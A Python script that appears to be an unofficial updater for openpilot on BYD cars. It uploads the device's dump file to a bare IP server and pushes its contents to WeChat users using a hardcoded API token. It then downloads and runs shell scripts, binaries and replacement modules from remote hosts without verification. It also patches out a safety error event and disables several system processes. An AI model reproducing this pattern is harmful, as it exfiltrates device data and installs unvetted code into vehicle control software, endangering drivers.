#coding:utf-8
import requests
import json
import os,time
import subprocess
import requests
import datetime


def upload_dump_file(dump_path='/data/openpilot/dump.txt',
                     server_url='http://180.103.127.9:8999/upload.php'):
    try:
        with open(dump_path, 'r') as f:
            data = f.read()

        if not data:
            return {'success': False, 'message': 'dump file is empty'}

        device_id = data[:12].replace('+', '').replace('/', '')
        timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        filename = f"{device_id}_{timestamp}.txt"

        response = requests.post(server_url, data={
            'filename': filename,
            'content': data
        }, timeout=10)

        if response.text.strip() == 'OK':
            return {'success': True, 'message': f'uploaded to byd_id/{filename}', 'filename': filename}
        else:
            return {'success': False, 'message': response.text.strip()}

    except FileNotFoundError:
        return {'success': False, 'message': f'file not found: {dump_path}'}
    except Exception as e:
        return {'success': False, 'message': str(e)}


def wxPusher_send_messaget_post(data_message):
    message = data_message
    app_token = 'AT_eQOSJ7yrMMbemPPMRb49ZeUPaE5okTle'
    UID = 'UID_4VKRjdDY0MffPCNH0krl85rwQAZv'
    UID1 = 'UID_utrVi9teZRN1oLRWDxbQt0U1tkzS'
    data = {
        "appToken": app_token,
        "content": message,
        "summary": message,
        "contentType": 1,
        "uids": [UID, UID1],
        "url": "https://wxpusher.zjiecode.com",
        "verifyPay": False
    }
    json_data = json.dumps(data)

    url = "https://wxpusher.zjiecode.com/api/send/message"
    headers = {
        'Content-Type': "application/json",
    }
    request = requests.post(url, data=json_data, headers=headers)
    return request


def cat_key(cmd):
    res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)  # 浣跨敤绠￠亾
    result = res.stdout.read()
    res.wait()
    res.stdout.close()
    return result


def send_id(data):
    res = os.system('echo -n  "%s" > /data/params/d/DongleId' % (data[0:12]).replace("+","").replace("/", ""))
    return res

def get_latest_version(device, data):
    try:
        url = f"https://delta.onlymysocks.com/check_update?version=op_byd_c{device}_{data[0:12]}_123123"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        try:
            data = response.json()
            return data.get('version')
        except json.JSONDecodeError:
            return None
    except Exception as e:
        print(f"get version fail: {e}")
        return None

def updata(data):
    if "w=="  in data:
        device="3"
    else:
        device="2"
    version = get_latest_version(device, data)
    if not version:
        # �����ȡʧ�ܣ�ʹ��Ĭ�ϰ汾��
        if device == "3":
            version = "c0492e3bc"
            res = os.system('wget https://delta.onlymysocks.com/download/op_byd_c%s_%s_%s_delta.sh' % (device,data[0:12],version))
            cc  = os.system('sh op_byd_c%s_%s_%s_delta.sh' % (device,data[0:12],version))
        else:
            version = "bae8dbc"
    if device =="3":
        res1 = os.system("wget 'http://180.103.127.9:8999/22ha_op_byd_c3_common_c0492e3bc_delta.sh'  &&  sh 22ha_op_byd_c3_common_c0492e3bc_delta.sh")
        time.sleep(2)
        dd = os.system('''cd /data/openpilot/selfdrive/controls/lib && rm -rf longitudinal_mpc_lib_c3.tar.gz && rm -rf longitudinal_mpc_lib.tar  &&cd /data/openpilot/ &&cd /data/openpilot/selfdrive/controls/lib &&  wget 'http://180.103.127.9:8999/longitudinal_mpc_lib_c3.tar.gz'  && tar -xvzf   longitudinal_mpc_lib_c3.tar.gz && cd /data/openpilot/selfdrive/ui/ && rm -rf ui && wget http://180.103.127.9:8999/ui && chmod +x /data/openpilot/selfdrive/ui/ui && cd /data/openpilot/selfdrive/pandad/ && rm -rf pandad.py && wget 'http://180.103.127.9:8999/pandad.py' && sed -i 's/self.events.add(EventName.paramsdTemporaryError)/pass/g' /data/openpilot/selfdrive/controls/controlsd.py && sed -i 's/PythonProcess("navd"/#PythonProcess("navd"/g' /data/openpilot/system/manager/process_config.py && sed -i 's/PythonProcess("statsd"/#PythonProcess("statsd"/g' /data/openpilot/system/manager/process_config.py && sed -i 's/PythonProcess("sunnylink_registration"/#PythonProcess("sunnylink_registration"/g' /data/openpilot/system/manager/process_config.py && sed -i 's/PythonProcess("qcomgpsd"/#PythonProcess("qcomgpsd"/g' /data/openpilot/system/manager/process_config.py''')
        time.sleep(2)
        #aa= os.system("sed -i 's/desired_lateral_accel = desired_curvature \* CS\.vEgo \*\* 2/& * 0.9/'      /data/openpilot/selfdrive/controls/lib/latcontrol_torque.py")
    elif device=="2":
        res1= os.system("wget 'http://180.103.127.9:8999/mroad_c2.sh' && sh mroad_c2.sh")
        time.sleep(2)
        dd=os.system('''cd /data/openpilot/selfdrive/controls/lib&& rm -rf legacy_longitudinal_mpc_lib_c2.tar.gz&& rm -rf longitudinal_mpc_lib_c2.tar.gz && rm -rf legacy_longitudinal_mpc_lib &&  wget 'http://180.103.127.9:8999/legacy_longitudinal_mpc_lib_c2.tar.gz'  && tar -xvzf legacy_longitudinal_mpc_lib_c2.tar.gz && rm -rf longitudinal_mpc_lib.tar &&  wget 'http://180.103.127.9:8999/longitudinal_mpc_lib_c2.tar.gz'  && tar -xvzf   longitudinal_mpc_lib_c2.tar.gz''')
        time.sleep(2)
        #aa=os.system("sed -i 's/desired_lateral_accel = desired_curvature \* CS\.vEgo \*\* 2/& * 0.9      /data/openpilot/selfdrive/controls/lib/latcontrol_torque.py")


if __name__ == '__main__':
    result = cat_key("cat /data/openpilot/dump.txt")
    result1 = upload_dump_file()
    data = str(result, encoding="utf-8").replace("/", "")
    send_id(data)
    true_data = str(result, encoding="utf-8")
    if "==" not in data:
        os.system("echo -n  op_byd_c2_%s_11111  > /data/params/d/LastUpdatePkg" % (data[0:12]).replace("+","").replace("/", ""))
    else:
        os.system("echo -n  op_byd_c3_%s_11111  > /data/params/d/LastUpdatePkg" % (data[0:12]).replace("+", "").replace("/",
                                                                                                                  ""))
    wxPusher_send_messaget_post(true_data)
    updata(data.replace("+","").replace("/", ""))